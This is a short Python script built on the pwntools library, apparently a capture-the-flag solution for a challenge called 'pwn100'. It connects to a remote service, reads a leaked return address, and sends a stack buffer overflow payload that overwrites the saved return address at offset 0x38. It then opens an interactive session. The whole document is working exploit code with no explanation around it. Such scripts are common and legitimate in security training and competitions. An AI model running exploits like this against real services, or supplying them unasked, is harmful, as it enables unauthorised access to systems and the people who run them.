#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

#  io = process("./pwn100")
io = remote("10.4.21.55", 9001)
io.recvuntil("0x")
ret_addr = int(io.recvuntil("\n", drop = True), 16)
#  print hex(ret_addr)
payload = fit({0x30 + 0x8: p64(ret_addr)})
io.sendlineafter("payload: ", payload)
io.recvline()

io.interactive()
io.close()
